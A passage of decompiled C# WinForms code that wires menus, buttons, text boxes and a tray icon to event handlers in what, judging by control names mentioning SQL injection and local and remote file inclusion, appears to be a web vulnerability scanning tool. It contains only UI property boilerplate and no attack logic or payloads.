	{
		[CompilerGenerated]
		get
		{
			return this._mnuHttpLogAutoScroll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_205);
			ToolStripMenuItem mnuHttpLogAutoScroll = this._mnuHttpLogAutoScroll;
			if (mnuHttpLogAutoScroll != null)
			{
				mnuHttpLogAutoScroll.CheckedChanged -= value2;
			}
			this._mnuHttpLogAutoScroll = value;
			mnuHttpLogAutoScroll = this._mnuHttpLogAutoScroll;
			if (mnuHttpLogAutoScroll != null)
			{
				mnuHttpLogAutoScroll.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x170003B6 RID: 950
	// (get) Token: 0x06000C31 RID: 3121 RVA: 0x00006F99 File Offset: 0x00005199
	// (set) Token: 0x06000C32 RID: 3122 RVA: 0x00056E70 File Offset: 0x00055070
	internal virtual TextBox txtExcludeUrlWords
	{
		[CompilerGenerated]
		get
		{
			return this._txtExcludeUrlWords;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_115);
			TextBox txtExcludeUrlWords = this._txtExcludeUrlWords;
			if (txtExcludeUrlWords != null)
			{
				txtExcludeUrlWords.TextChanged -= value2;
			}
			this._txtExcludeUrlWords = value;
			txtExcludeUrlWords = this._txtExcludeUrlWords;
			if (txtExcludeUrlWords != null)
			{
				txtExcludeUrlWords.TextChanged += value2;
			}
		}
	}

	// Token: 0x170003B7 RID: 951
	// (get) Token: 0x06000C33 RID: 3123 RVA: 0x00006FA1 File Offset: 0x000051A1
	// (set) Token: 0x06000C34 RID: 3124 RVA: 0x00006FA9 File Offset: 0x000051A9
	internal virtual Label lblHTTPdelayIP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003B8 RID: 952
	// (get) Token: 0x06000C35 RID: 3125 RVA: 0x00006FB2 File Offset: 0x000051B2
	// (set) Token: 0x06000C36 RID: 3126 RVA: 0x00056EB4 File Offset: 0x000550B4
	internal virtual ToolStripStatusLabel lblDownloads
	{
		[CompilerGenerated]
		get
		{
			return this._lblDownloads;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			MouseEventHandler value2 = new MouseEventHandler(this.method_210);
			ToolStripStatusLabel lblDownloads = this._lblDownloads;
			if (lblDownloads != null)
			{
				lblDownloads.MouseDown -= value2;
			}
			this._lblDownloads = value;
			lblDownloads = this._lblDownloads;
			if (lblDownloads != null)
			{
				lblDownloads.MouseDown += value2;
			}
		}
	}

	// Token: 0x170003B9 RID: 953
	// (get) Token: 0x06000C37 RID: 3127 RVA: 0x00006FBA File Offset: 0x000051BA
	// (set) Token: 0x06000C38 RID: 3128 RVA: 0x00056EF8 File Offset: 0x000550F8
	internal virtual ContextMenuStrip mnuQueue
	{
		[CompilerGenerated]
		get
		{
			return this._mnuChecked_4;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler value2 = new CancelEventHandler(this.method_151);
			ContextMenuStrip mnuChecked_ = this._mnuChecked_4;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			this._mnuChecked_4 = value;
			mnuChecked_ = this._mnuChecked_4;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	// Token: 0x170003BA RID: 954
	// (get) Token: 0x06000C39 RID: 3129 RVA: 0x00006FC2 File Offset: 0x000051C2
	// (set) Token: 0x06000C3A RID: 3130 RVA: 0x00056F3C File Offset: 0x0005513C
	internal virtual ToolStripMenuItem mnuQueueClipboard
	{
		[CompilerGenerated]
		get
		{
			return this._mnuQueueClipboard;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_153);
			ToolStripMenuItem mnuQueueClipboard = this._mnuQueueClipboard;
			if (mnuQueueClipboard != null)
			{
				mnuQueueClipboard.Click -= value2;
			}
			this._mnuQueueClipboard = value;
			mnuQueueClipboard = this._mnuQueueClipboard;
			if (mnuQueueClipboard != null)
			{
				mnuQueueClipboard.Click += value2;
			}
		}
	}

	// Token: 0x170003BB RID: 955
	// (get) Token: 0x06000C3B RID: 3131 RVA: 0x00006FCA File Offset: 0x000051CA
	// (set) Token: 0x06000C3C RID: 3132 RVA: 0x00056F80 File Offset: 0x00055180
	internal virtual ToolStripMenuItem mnuQueueSelectAll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuQueueSelectAll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_154);
			ToolStripMenuItem mnuQueueSelectAll = this._mnuQueueSelectAll;
			if (mnuQueueSelectAll != null)
			{
				mnuQueueSelectAll.Click -= value2;
			}
			this._mnuQueueSelectAll = value;
			mnuQueueSelectAll = this._mnuQueueSelectAll;
			if (mnuQueueSelectAll != null)
			{
				mnuQueueSelectAll.Click += value2;
			}
		}
	}

	// Token: 0x170003BC RID: 956
	// (get) Token: 0x06000C3D RID: 3133 RVA: 0x00006FD2 File Offset: 0x000051D2
	// (set) Token: 0x06000C3E RID: 3134 RVA: 0x00006FDA File Offset: 0x000051DA
	internal virtual ToolStripSeparator mnuQueueSP2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003BD RID: 957
	// (get) Token: 0x06000C3F RID: 3135 RVA: 0x00006FE3 File Offset: 0x000051E3
	// (set) Token: 0x06000C40 RID: 3136 RVA: 0x00056FC4 File Offset: 0x000551C4
	internal virtual ToolStripMenuItem mnuQueueRomove
	{
		[CompilerGenerated]
		get
		{
			return this._mnuQueueRomove;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_155);
			ToolStripMenuItem mnuQueueRomove = this._mnuQueueRomove;
			if (mnuQueueRomove != null)
			{
				mnuQueueRomove.Click -= value2;
			}
			this._mnuQueueRomove = value;
			mnuQueueRomove = this._mnuQueueRomove;
			if (mnuQueueRomove != null)
			{
				mnuQueueRomove.Click += value2;
			}
		}
	}

	// Token: 0x170003BE RID: 958
	// (get) Token: 0x06000C41 RID: 3137 RVA: 0x00006FEB File Offset: 0x000051EB
	// (set) Token: 0x06000C42 RID: 3138 RVA: 0x00057008 File Offset: 0x00055208
	internal virtual ToolStripMenuItem mnuQueueShell
	{
		[CompilerGenerated]
		get
		{
			return this._mnuQueueShell;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_152);
			ToolStripMenuItem mnuQueueShell = this._mnuQueueShell;
			if (mnuQueueShell != null)
			{
				mnuQueueShell.Click -= value2;
			}
			this._mnuQueueShell = value;
			mnuQueueShell = this._mnuQueueShell;
			if (mnuQueueShell != null)
			{
				mnuQueueShell.Click += value2;
			}
		}
	}

	// Token: 0x170003BF RID: 959
	// (get) Token: 0x06000C43 RID: 3139 RVA: 0x00006FF3 File Offset: 0x000051F3
	// (set) Token: 0x06000C44 RID: 3140 RVA: 0x0005704C File Offset: 0x0005524C
	internal virtual ListBox lstExcludeUrlWords
	{
		[CompilerGenerated]
		get
		{
			return this._lstExcludeUrlWords;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_114);
			ListBox lstExcludeUrlWords = this._lstExcludeUrlWords;
			if (lstExcludeUrlWords != null)
			{
				lstExcludeUrlWords.Leave -= value2;
			}
			this._lstExcludeUrlWords = value;
			lstExcludeUrlWords = this._lstExcludeUrlWords;
			if (lstExcludeUrlWords != null)
			{
				lstExcludeUrlWords.Leave += value2;
			}
		}
	}

	// Token: 0x170003C0 RID: 960
	// (get) Token: 0x06000C45 RID: 3141 RVA: 0x00006FFB File Offset: 0x000051FB
	// (set) Token: 0x06000C46 RID: 3142 RVA: 0x00007003 File Offset: 0x00005203
	internal virtual Label lblSkipWordURL { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003C1 RID: 961
	// (get) Token: 0x06000C47 RID: 3143 RVA: 0x0000700C File Offset: 0x0000520C
	// (set) Token: 0x06000C48 RID: 3144 RVA: 0x00057090 File Offset: 0x00055290
	internal virtual Button btnExcludeUrlWords
	{
		[CompilerGenerated]
		get
		{
			return this._btnExcludeUrlWords;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_116);
			Button btnExcludeUrlWords = this._btnExcludeUrlWords;
			if (btnExcludeUrlWords != null)
			{
				btnExcludeUrlWords.Click -= value2;
			}
			this._btnExcludeUrlWords = value;
			btnExcludeUrlWords = this._btnExcludeUrlWords;
			if (btnExcludeUrlWords != null)
			{
				btnExcludeUrlWords.Click += value2;
			}
		}
	}

	// Token: 0x170003C2 RID: 962
	// (get) Token: 0x06000C49 RID: 3145 RVA: 0x00007014 File Offset: 0x00005214
	// (set) Token: 0x06000C4A RID: 3146 RVA: 0x0000701C File Offset: 0x0000521C
	internal virtual ContextMenuStrip mnuExcludeUrlWords { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003C3 RID: 963
	// (get) Token: 0x06000C4B RID: 3147 RVA: 0x00007025 File Offset: 0x00005225
	// (set) Token: 0x06000C4C RID: 3148 RVA: 0x000570D4 File Offset: 0x000552D4
	internal virtual ToolStripMenuItem mnuExcludeUrlWordsRemove
	{
		[CompilerGenerated]
		get
		{
			return this._mnuExcludeUrlWordsRemove;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_117);
			ToolStripMenuItem mnuExcludeUrlWordsRemove = this._mnuExcludeUrlWordsRemove;
			if (mnuExcludeUrlWordsRemove != null)
			{
				mnuExcludeUrlWordsRemove.Click -= value2;
			}
			this._mnuExcludeUrlWordsRemove = value;
			mnuExcludeUrlWordsRemove = this._mnuExcludeUrlWordsRemove;
			if (mnuExcludeUrlWordsRemove != null)
			{
				mnuExcludeUrlWordsRemove.Click += value2;
			}
		}
	}

	// Token: 0x170003C4 RID: 964
	// (get) Token: 0x06000C4D RID: 3149 RVA: 0x0000702D File Offset: 0x0000522D
	// (set) Token: 0x06000C4E RID: 3150 RVA: 0x00007035 File Offset: 0x00005235
	internal virtual Label lblSearchSummary_2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003C5 RID: 965
	// (get) Token: 0x06000C4F RID: 3151 RVA: 0x0000703E File Offset: 0x0000523E
	// (set) Token: 0x06000C50 RID: 3152 RVA: 0x00007046 File Offset: 0x00005246
	internal virtual ToolStrip tsFileInclusao { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003C6 RID: 966
	// (get) Token: 0x06000C51 RID: 3153 RVA: 0x0000704F File Offset: 0x0000524F
	// (set) Token: 0x06000C52 RID: 3154 RVA: 0x00007057 File Offset: 0x00005257
	internal virtual ToolStripComboBox cmbFileInclusaoSearch { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003C7 RID: 967
	// (get) Token: 0x06000C53 RID: 3155 RVA: 0x00007060 File Offset: 0x00005260
	// (set) Token: 0x06000C54 RID: 3156 RVA: 0x00057118 File Offset: 0x00055318
	internal virtual ToolStripButton btnFileInclusaoSearchClear
	{
		[CompilerGenerated]
		get
		{
			return this._btnFileInclusaoSearchClear;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_172);
			ToolStripButton btnFileInclusaoSearchClear = this._btnFileInclusaoSearchClear;
			if (btnFileInclusaoSearchClear != null)
			{
				btnFileInclusaoSearchClear.Click -= value2;
			}
			this._btnFileInclusaoSearchClear = value;
			btnFileInclusaoSearchClear = this._btnFileInclusaoSearchClear;
			if (btnFileInclusaoSearchClear != null)
			{
				btnFileInclusaoSearchClear.Click += value2;
			}
		}
	}

	// Token: 0x170003C8 RID: 968
	// (get) Token: 0x06000C55 RID: 3157 RVA: 0x00007068 File Offset: 0x00005268
	// (set) Token: 0x06000C56 RID: 3158 RVA: 0x0005715C File Offset: 0x0005535C
	internal virtual ToolStripButton btnFileInclusaoSearch
	{
		[CompilerGenerated]
		get
		{
			return this._btnFileInclusaoSearch;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_172);
			ToolStripButton btnFileInclusaoSearch = this._btnFileInclusaoSearch;
			if (btnFileInclusaoSearch != null)
			{
				btnFileInclusaoSearch.Click -= value2;
			}
			this._btnFileInclusaoSearch = value;
			btnFileInclusaoSearch = this._btnFileInclusaoSearch;
			if (btnFileInclusaoSearch != null)
			{
				btnFileInclusaoSearch.Click += value2;
			}
		}
	}

	// Token: 0x170003C9 RID: 969
	// (get) Token: 0x06000C57 RID: 3159 RVA: 0x00007070 File Offset: 0x00005270
	// (set) Token: 0x06000C58 RID: 3160 RVA: 0x00007078 File Offset: 0x00005278
	internal virtual ToolStripLabel lblFileInclusao { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003CA RID: 970
	// (get) Token: 0x06000C59 RID: 3161 RVA: 0x00007081 File Offset: 0x00005281
	// (set) Token: 0x06000C5A RID: 3162 RVA: 0x00007089 File Offset: 0x00005289
	internal virtual ToolStripSeparator lblSQLiNoInjectCount { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003CB RID: 971
	// (get) Token: 0x06000C5B RID: 3163 RVA: 0x00007092 File Offset: 0x00005292
	// (set) Token: 0x06000C5C RID: 3164 RVA: 0x0000709A File Offset: 0x0000529A
	internal virtual Label lblLFIPathCount { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003CC RID: 972
	// (get) Token: 0x06000C5D RID: 3165 RVA: 0x000070A3 File Offset: 0x000052A3
	// (set) Token: 0x06000C5E RID: 3166 RVA: 0x000070AB File Offset: 0x000052AB
	internal virtual VisualStyler VisualStyler1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003CD RID: 973
	// (get) Token: 0x06000C5F RID: 3167 RVA: 0x000070B4 File Offset: 0x000052B4
	// (set) Token: 0x06000C60 RID: 3168 RVA: 0x000070BC File Offset: 0x000052BC
	internal virtual GroupBox GroupBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003CE RID: 974
	// (get) Token: 0x06000C61 RID: 3169 RVA: 0x000070C5 File Offset: 0x000052C5
	// (set) Token: 0x06000C62 RID: 3170 RVA: 0x000070CD File Offset: 0x000052CD
	internal virtual GroupBox grbExploithing { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003CF RID: 975
	// (get) Token: 0x06000C63 RID: 3171 RVA: 0x000070D6 File Offset: 0x000052D6
	// (set) Token: 0x06000C64 RID: 3172 RVA: 0x000070DE File Offset: 0x000052DE
	internal virtual GroupBox GroupBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003D0 RID: 976
	// (get) Token: 0x06000C65 RID: 3173 RVA: 0x000070E7 File Offset: 0x000052E7
	// (set) Token: 0x06000C66 RID: 3174 RVA: 0x000070EF File Offset: 0x000052EF
	internal virtual Panel pnlSettingsAdvanced { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003D1 RID: 977
	// (get) Token: 0x06000C67 RID: 3175 RVA: 0x000070F8 File Offset: 0x000052F8
	// (set) Token: 0x06000C68 RID: 3176 RVA: 0x00007100 File Offset: 0x00005300
	internal virtual GroupBox grbRFI { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003D2 RID: 978
	// (get) Token: 0x06000C69 RID: 3177 RVA: 0x00007109 File Offset: 0x00005309
	// (set) Token: 0x06000C6A RID: 3178 RVA: 0x00007111 File Offset: 0x00005311
	internal virtual GroupBox grbLfiLinux { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003D3 RID: 979
	// (get) Token: 0x06000C6B RID: 3179 RVA: 0x0000711A File Offset: 0x0000531A
	// (set) Token: 0x06000C6C RID: 3180 RVA: 0x00007122 File Offset: 0x00005322
	internal virtual Label lblRFIurl { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003D4 RID: 980
	// (get) Token: 0x06000C6D RID: 3181 RVA: 0x0000712B File Offset: 0x0000532B
	// (set) Token: 0x06000C6E RID: 3182 RVA: 0x000571A0 File Offset: 0x000553A0
	internal virtual TextBox txtRFIurl
	{
		[CompilerGenerated]
		get
		{
			return this._txtRFIurl;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_110);
			TextBox txtRFIurl = this._txtRFIurl;
			if (txtRFIurl != null)
			{
				txtRFIurl.TextChanged -= value2;
			}
			this._txtRFIurl = value;
			txtRFIurl = this._txtRFIurl;
			if (txtRFIurl != null)
			{
				txtRFIurl.TextChanged += value2;
			}
		}
	}

	// Token: 0x170003D5 RID: 981
	// (get) Token: 0x06000C6F RID: 3183 RVA: 0x00007133 File Offset: 0x00005333
	// (set) Token: 0x06000C70 RID: 3184 RVA: 0x0000713B File Offset: 0x0000533B
	internal virtual Label lblRFIkeyword { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003D6 RID: 982
	// (get) Token: 0x06000C71 RID: 3185 RVA: 0x00007144 File Offset: 0x00005344
	// (set) Token: 0x06000C72 RID: 3186 RVA: 0x000571E4 File Offset: 0x000553E4
	internal virtual TextBox txtRFIkeyword
	{
		[CompilerGenerated]
		get
		{
			return this._txtRFIkeyword;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_110);
			TextBox txtRFIkeyword = this._txtRFIkeyword;
			if (txtRFIkeyword != null)
			{
				txtRFIkeyword.TextChanged -= value2;
			}
			this._txtRFIkeyword = value;
			txtRFIkeyword = this._txtRFIkeyword;
			if (txtRFIkeyword != null)
			{
				txtRFIkeyword.TextChanged += value2;
			}
		}
	}

	// Token: 0x170003D7 RID: 983
	// (get) Token: 0x06000C73 RID: 3187 RVA: 0x0000714C File Offset: 0x0000534C
	// (set) Token: 0x06000C74 RID: 3188 RVA: 0x00007154 File Offset: 0x00005354
	internal virtual Label lblAdvanced { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003D8 RID: 984
	// (get) Token: 0x06000C75 RID: 3189 RVA: 0x0000715D File Offset: 0x0000535D
	// (set) Token: 0x06000C76 RID: 3190 RVA: 0x00007165 File Offset: 0x00005365
	internal virtual TextBox txtNotepad { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003D9 RID: 985
	// (get) Token: 0x06000C77 RID: 3191 RVA: 0x0000716E File Offset: 0x0000536E
	// (set) Token: 0x06000C78 RID: 3192 RVA: 0x00057228 File Offset: 0x00055428
	internal virtual ContextMenuStrip mnuTrash
	{
		[CompilerGenerated]
		get
		{
			return this._mnuChecked_5;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler value2 = new CancelEventHandler(this.method_143);
			ContextMenuStrip mnuChecked_ = this._mnuChecked_5;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			this._mnuChecked_5 = value;
			mnuChecked_ = this._mnuChecked_5;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	// Token: 0x170003DA RID: 986
	// (get) Token: 0x06000C79 RID: 3193 RVA: 0x00007176 File Offset: 0x00005376
	// (set) Token: 0x06000C7A RID: 3194 RVA: 0x0005726C File Offset: 0x0005546C
	internal virtual ToolStripMenuItem mnuTrashClippboard
	{
		[CompilerGenerated]
		get
		{
			return this._mnuTrashClippboard;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_145);
			ToolStripMenuItem mnuTrashClippboard = this._mnuTrashClippboard;
			if (mnuTrashClippboard != null)
			{
				mnuTrashClippboard.Click -= value2;
			}
			this._mnuTrashClippboard = value;
			mnuTrashClippboard = this._mnuTrashClippboard;
			if (mnuTrashClippboard != null)
			{
				mnuTrashClippboard.Click += value2;
			}
		}
	}

	// Token: 0x170003DB RID: 987
	// (get) Token: 0x06000C7B RID: 3195 RVA: 0x0000717E File Offset: 0x0000537E
	// (set) Token: 0x06000C7C RID: 3196 RVA: 0x000572B0 File Offset: 0x000554B0
	internal virtual ToolStripMenuItem mnuTrashSelectAll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuTrashSelectAll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_146);
			ToolStripMenuItem mnuTrashSelectAll = this._mnuTrashSelectAll;
			if (mnuTrashSelectAll != null)
			{
				mnuTrashSelectAll.Click -= value2;
			}
			this._mnuTrashSelectAll = value;
			mnuTrashSelectAll = this._mnuTrashSelectAll;
			if (mnuTrashSelectAll != null)
			{
				mnuTrashSelectAll.Click += value2;
			}
		}
	}

	// Token: 0x170003DC RID: 988
	// (get) Token: 0x06000C7D RID: 3197 RVA: 0x00007186 File Offset: 0x00005386
	// (set) Token: 0x06000C7E RID: 3198 RVA: 0x0000718E File Offset: 0x0000538E
	internal virtual ToolStripSeparator ToolStripSeparator8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003DD RID: 989
	// (get) Token: 0x06000C7F RID: 3199 RVA: 0x00007197 File Offset: 0x00005397
	// (set) Token: 0x06000C80 RID: 3200 RVA: 0x000572F4 File Offset: 0x000554F4
	internal virtual ToolStripMenuItem mnuTrashClearAll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuTrashClearAll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_147);
			ToolStripMenuItem mnuTrashClearAll = this._mnuTrashClearAll;
			if (mnuTrashClearAll != null)
			{
				mnuTrashClearAll.Click -= value2;
			}
			this._mnuTrashClearAll = value;
			mnuTrashClearAll = this._mnuTrashClearAll;
			if (mnuTrashClearAll != null)
			{
				mnuTrashClearAll.Click += value2;
			}
		}
	}

	// Token: 0x170003DE RID: 990
	// (get) Token: 0x06000C81 RID: 3201 RVA: 0x0000719F File Offset: 0x0000539F
	// (set) Token: 0x06000C82 RID: 3202 RVA: 0x000071A7 File Offset: 0x000053A7
	internal virtual ToolStripSeparator ToolStripSeparator10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003DF RID: 991
	// (get) Token: 0x06000C83 RID: 3203 RVA: 0x000071B0 File Offset: 0x000053B0
	// (set) Token: 0x06000C84 RID: 3204 RVA: 0x00057338 File Offset: 0x00055538
	internal virtual ToolStripMenuItem mnuTrashRemove
	{
		[CompilerGenerated]
		get
		{
			return this._mnuTrashRemove;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_148);
			ToolStripMenuItem mnuTrashRemove = this._mnuTrashRemove;
			if (mnuTrashRemove != null)
			{
				mnuTrashRemove.Click -= value2;
			}
			this._mnuTrashRemove = value;
			mnuTrashRemove = this._mnuTrashRemove;
			if (mnuTrashRemove != null)
			{
				mnuTrashRemove.Click += value2;
			}
		}
	}

	// Token: 0x170003E0 RID: 992
	// (get) Token: 0x06000C85 RID: 3205 RVA: 0x000071B8 File Offset: 0x000053B8
	// (set) Token: 0x06000C86 RID: 3206 RVA: 0x000071C0 File Offset: 0x000053C0
	internal virtual ToolStripSeparator ToolStripSeparator11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003E1 RID: 993
	// (get) Token: 0x06000C87 RID: 3207 RVA: 0x000071C9 File Offset: 0x000053C9
	// (set) Token: 0x06000C88 RID: 3208 RVA: 0x000071D1 File Offset: 0x000053D1
	internal virtual ToolStripMenuItem mnuTrashCount { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003E2 RID: 994
	// (get) Token: 0x06000C89 RID: 3209 RVA: 0x000071DA File Offset: 0x000053DA
	// (set) Token: 0x06000C8A RID: 3210 RVA: 0x0005737C File Offset: 0x0005557C
	internal virtual ComboBox cmbGUIHotKey
	{
		[CompilerGenerated]
		get
		{
			return this._cmbGUIHotKey;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_6);
			ComboBox cmbGUIHotKey = this._cmbGUIHotKey;
			if (cmbGUIHotKey != null)
			{
				cmbGUIHotKey.SelectedIndexChanged -= value2;
			}
			this._cmbGUIHotKey = value;
			cmbGUIHotKey = this._cmbGUIHotKey;
			if (cmbGUIHotKey != null)
			{
				cmbGUIHotKey.SelectedIndexChanged += value2;
			}
		}
	}

	// Token: 0x170003E3 RID: 995
	// (get) Token: 0x06000C8B RID: 3211 RVA: 0x000071E2 File Offset: 0x000053E2
	// (set) Token: 0x06000C8C RID: 3212 RVA: 0x000573C0 File Offset: 0x000555C0
	internal virtual CheckBox chkGUIHotKey
	{
		[CompilerGenerated]
		get
		{
			return this._chkGUIHotKey;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_5);
			CheckBox chkGUIHotKey = this._chkGUIHotKey;
			if (chkGUIHotKey != null)
			{
				chkGUIHotKey.CheckedChanged -= value2;
			}
			this._chkGUIHotKey = value;
			chkGUIHotKey = this._chkGUIHotKey;
			if (chkGUIHotKey != null)
			{
				chkGUIHotKey.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x170003E4 RID: 996
	// (get) Token: 0x06000C8D RID: 3213 RVA: 0x000071EA File Offset: 0x000053EA
	// (set) Token: 0x06000C8E RID: 3214 RVA: 0x000071F2 File Offset: 0x000053F2
	internal virtual CheckBox chkSysTray { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003E5 RID: 997
	// (get) Token: 0x06000C8F RID: 3215 RVA: 0x000071FB File Offset: 0x000053FB
	// (set) Token: 0x06000C90 RID: 3216 RVA: 0x00057404 File Offset: 0x00055604
	internal virtual NotifyIcon ntfTray
	{
		[CompilerGenerated]
		get
		{
			return this.notifyIcon_0;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_4);
			EventHandler value3 = new EventHandler(this.method_4);
			NotifyIcon notifyIcon = this.notifyIcon_0;
			if (notifyIcon != null)
			{
				notifyIcon.Click -= value2;
				notifyIcon.BalloonTipClicked -= value3;
			}
			this.notifyIcon_0 = value;
			notifyIcon = this.notifyIcon_0;
			if (notifyIcon != null)
			{
				notifyIcon.Click += value2;
				notifyIcon.BalloonTipClicked += value3;
			}
		}
	}

	// Token: 0x170003E6 RID: 998
	// (get) Token: 0x06000C91 RID: 3217 RVA: 0x00007203 File Offset: 0x00005403
	// (set) Token: 0x06000C92 RID: 3218 RVA: 0x0000720B File Offset: 0x0000540B
	internal virtual GroupBox grbAppSetthings { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x170003E7 RID: 999
	// (get) Token: 0x06000C93 RID: 3219 RVA: 0x00007214 File Offset: 0x00005414
	// (set) Token: 0x06000C94 RID: 3220 RVA: 0x00057464 File Offset: 0x00055664
	internal virtual Button btnSettingSave
	{
		[CompilerGenerated]
		get
		{
			return this._btnSettingSave;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_69);
			Button btnSettingSave = this._btnSettingSave;
			if (btnSettingSave != null)
			{
				btnSettingSave.Click -= value2;
			}
			this._btnSettingSave = value;
			btnSettingSave = this._btnSettingSave;
			if (btnSettingSave != null)
			{
				btnSettingSave.Click += value2;
			}
		}
	}

	// Token: 0x170003E8 RID: 1000
	// (get) Token: 0x06000C95 RID: 3221 RVA: 0x0000721C File Offset: 0x0000541C
	// (set) Token: 0x06000C96 RID: 3222 RVA: 0x000574A8 File Offset: 0x000556A8
	internal virtual Button btnSettingReLoad
	{
		[CompilerGenerated]
		get
		{
			return this._btnSettingReLoad;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_70);
			Button btnSettingReLoad = this._btnSettingReLoad;
			if (btnSettingReLoad != null)
			{
				btnSettingReLoad.Click -= value2;
			}
			this._btnSettingReLoad = value;
			btnSettingReLoad = this._btnSettingReLoad;
			if (btnSettingReLoad != null)
			{
				btnSettingReLoad.Click += value2;
			}
		}
	}

	// Token: 0x170003E9 RID: 1001
	// (get) Token: 0x06000C97 RID: 3223 RVA: 0x00007224 File Offset: 0x00005424
	// (set) Token: 0x06000C98 RID: 3224 RVA: 0x000574EC File Offset: 0x000556EC
	internal virtual Button btnSettingReset
	{
		[CompilerGenerated]
		get
		{
			return this._btnSettingReset;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_71);
			Button btnSettingReset = this._btnSettingReset;
			if (btnSettingReset != null)
			{
